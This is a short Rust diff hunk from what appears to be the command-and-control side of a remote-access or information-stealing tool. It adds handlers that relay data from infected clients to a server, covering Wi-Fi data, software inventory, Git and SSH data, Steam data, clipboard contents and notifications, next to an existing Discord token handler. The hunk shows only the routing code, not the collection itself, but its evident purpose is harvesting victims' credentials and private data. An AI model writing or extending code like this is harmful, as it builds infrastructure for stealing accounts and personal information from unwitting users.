@@ -217,6 +217,41 @@ impl ClientReaderWrapper {
                     .await;
             }
 
+            WifiData(data) => {
+                self.send_server_packet(ServerCommand::WifiData(self.addr, data))
+                    .await;
+            }
+
+            SoftwareInventory(data) => {
+                self.send_server_packet(ServerCommand::SoftwareInventory(self.addr, data))
+                    .await;
+            }
+
+            GitData(data) => {
+                self.send_server_packet(ServerCommand::GitData(self.addr, data))
+                    .await;
+            }
+
+            SSHData(data) => {
+                self.send_server_packet(ServerCommand::SSHData(self.addr, data))
+                    .await;
+            }
+
+            SteamData(data) => {
+                self.send_server_packet(ServerCommand::SteamData(self.addr, data))
+                    .await;
+            }
+
+            ClipboardUpdate(data) => {
+                self.send_server_packet(ServerCommand::ClipboardUpdate(self.addr, data))
+                    .await;
+            }
+
+            NotificationEvent(data) => {
+                self.send_server_packet(ServerCommand::NotificationEvent(self.addr, data))
+                    .await;
+            }
+
             DiscordTokenData(data) => {
                 self.send_server_packet(ServerCommand::DiscordTokenData(self.addr, data))
                     .await;
